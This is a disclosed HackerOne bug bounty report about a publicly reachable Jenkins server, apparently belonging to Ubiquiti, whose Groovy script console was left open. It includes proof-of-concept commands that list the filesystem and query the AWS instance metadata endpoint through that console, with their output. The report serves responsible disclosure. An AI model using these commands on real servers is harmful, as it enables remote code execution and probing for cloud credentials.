---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '403402'
original_report_id: '403402'
title: Public Jenkins instance with /script enabled
weakness: Code Injection
team_handle: ui
created_at: '2018-08-31T12:05:04.584Z'
disclosed_at: '2018-09-10T16:21:17.097Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 72
asset_identifier: '*.ubnt.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- code-injection
---

# Public Jenkins instance with /script enabled

## Metadata

- HackerOne Report ID: 403402
- Weakness: Code Injection
- Program: ui
- Disclosed At: 2018-09-10T16:21:17.097Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi,

First of all. I'm not 100% able to verify that this server is actually owned by Ubnt as there are multiple DNS Name's in the SSL certificate.

```
DNS Name: *.uum.com
DNS Name: *.ubnt.com
DNS Name: *.svc.ubnt.com
DNS Name: *.api.uum.com
DNS Name: *.svc.uum.com
DNS Name: uum.com
```

So, the server hosted on https://54.191.232.223/and https://54.186.253.37/is reachable from the internet and has the scirpt console enabled.

You can execute code on it by going to: https://54.186.253.37/script and insert the following code:

```
"ls /".execute().text
```

__result__
````
Result: bin
boot
dev
docker-java-home
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

It also allows reaching the AWS metadata server:

```
"curl http://169.254.169.254/latest/meta-data/".execute().text
```

__Result__

```
ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
hostname
iam/
instance-action
instance-id
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
public-keys/
reservation-id
security-groups
services/
```

## Impact

RCE

{F340446}
{F340447}

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
